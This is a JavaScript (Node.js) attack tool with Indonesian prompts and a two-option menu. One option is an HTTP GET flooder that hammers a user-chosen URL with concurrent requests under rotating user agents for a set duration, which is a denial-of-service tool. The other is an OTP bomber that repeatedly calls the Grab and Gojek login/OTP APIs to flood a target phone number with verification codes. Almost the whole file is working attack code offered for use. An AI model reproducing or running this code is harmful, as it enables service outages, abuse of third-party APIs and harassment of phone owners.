const readline = require("readline");
const os = require("os");
const https = require("https");

// Untuk spam OTP
function runOtpSpam(nomor, jumlah) {
  let count = 0;
  const apis = [apiGrab, apiGojek];

  function sendNext() {
    if (count >= jumlah) {
      console.log(`\n[✓] Selesai spam ${jumlah} OTP ke ${nomor}`);
      return;
    }
    const apiFunc = apis[count % apis.length];
    apiFunc(nomor, () => {
      count++;
      setTimeout(sendNext, 2000);
    });
  }

  console.log(`[!] Mulai spam OTP ke ${nomor} sebanyak ${jumlah}x`);
  sendNext();
}

function apiGrab(nomor, callback) {
  const formatted = nomor.startsWith("0") ? nomor : "0" + nomor;
  const postData = JSON.stringify({
    method: "SEND_OTP",
    countryCode: "ID",
    phoneNumber: formatted.replace(/^0/, "")
  });

  const options = {
    hostname: "api.grab.com",
    path: "/wallet/v1/account/otp",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0",
      "Content-Length": Buffer.byteLength(postData)
    }
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      if (res.statusCode === 200 || res.statusCode === 201) {
        try {
          const json = JSON.parse(data);
          if (json && (json.otpSent === true || json.status === "success")) {
            console.log(`[+] [Grab] OTP terkirim ke ${nomor}`);
          } else {
            console.log(`[!] [Grab] Gagal kirim OTP`);
          }
        } catch {
          console.log(`[!] [Grab] Gagal parsing response`);
        }
      } else {
        console.log(`[!] [Grab] Status code ${res.statusCode}`);
      }
      callback();
    });
  });

  req.on("error", (e) => {
    console.log(`[!] [Grab] Error: ${e.message}`);
    callback();
  });

  req.write(postData);
  req.end();
}

function apiGojek(nomor, callback) {
  const formatted = nomor.startsWith("0") ? nomor : "0" + nomor;
  const postData = JSON.stringify({
    phone: formatted
  });

  const options = {
    hostname: "api.gojekapi.com",
    path: "/v5/customers/login_with_phone",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0",
      "Content-Length": Buffer.byteLength(postData),
      "X-AppVersion": "3.30.1",
      "X-Platform": "Android"
    }
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      if (res.statusCode === 200) {
        try {
          const json = JSON.parse(data);
          if (json && json.success === true) {
            console.log(`[+] [Gojek] OTP terkirim ke ${nomor}`);
          } else {
            console.log(`[!] [Gojek] Gagal kirim OTP`);
          }
        } catch {
          console.log(`[!] [Gojek] Gagal parsing response`);
        }
      } else {
        console.log(`[!] [Gojek] Status code ${res.statusCode}`);
      }
      callback();
    });
  });

  req.on("error", (e) => {
    console.log(`[!] [Gojek] Error: ${e.message}`);
    callback();
  });

  req.write(postData);
  req.end();
}

// Flood HTTP GET lebih ganas
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/99.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
  "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox/112.0"
];

function randomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function flood(target, durationSeconds, concurrency = 20) {
  const endTime = Date.now() + durationSeconds * 1000;

  let totalRequests = 0;
  let successCount = 0;
  let failCount = 0;

  function sendRequest() {
    if (Date.now() > endTime) return;

    const options = new URL(target);
    options.headers = {
      "User-Agent": randomUserAgent(),
      "Accept": "*/*",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache"
    };

    const req = https.request(options, (res) => {
      successCount++;
      res.on("data", () => {}); // consume data
      res.on("end", () => {
        totalRequests++;
        sendRequest(); // loop lagi
      });
    });

    req.on("error", () => {
      failCount++;
      totalRequests++;
      sendRequest(); // loop lagi
    });

    req.end();
  }

  for (let i = 0; i < concurrency; i++) {
    sendRequest();
  }

  const interval = setInterval(() => {
    console.clear();
    console.log(`Flooding: ${target}`);
    console.log(`Waktu tersisa: ${Math.max(0, Math.ceil((endTime - Date.now()) / 1000))} detik`);
    console.log(`Total Request : ${totalRequests}`);
    console.log(`Sukses       : ${successCount}`);
    console.log(`Gagal        : ${failCount}`);
    const persentase = totalRequests === 0 ? 0 : ((successCount / totalRequests) * 100).toFixed(2);
    console.log(`Persentase sukses: ${persentase}%`);
    if (Date.now() > endTime) {
      clearInterval(interval);
      console.log("\n[✓] Flood selesai.");
    }
  }, 5000);
}

// Menu utama
function showMenu() {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood (HTTP GET, ganas)");
  console.log("2. Spam OTP (Grab + Gojek)");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL (harus https://): ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            rl.question("Concurrency (misal 20): ", (conc) => {
              flood(url, parseInt(time), parseInt(conc) || 20);
              rl.close();
            });
          });
        });
        break;

      case '2':
        rl.question("Nomor HP (contoh 08123456789): ", (nomor) => {
          rl.question("Jumlah spam OTP: ", (jumlah) => {
            runOtpSpam(nomor, parseInt(jumlah));
            rl.close();
          });
        });
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

// Jalankan menu
showMenu();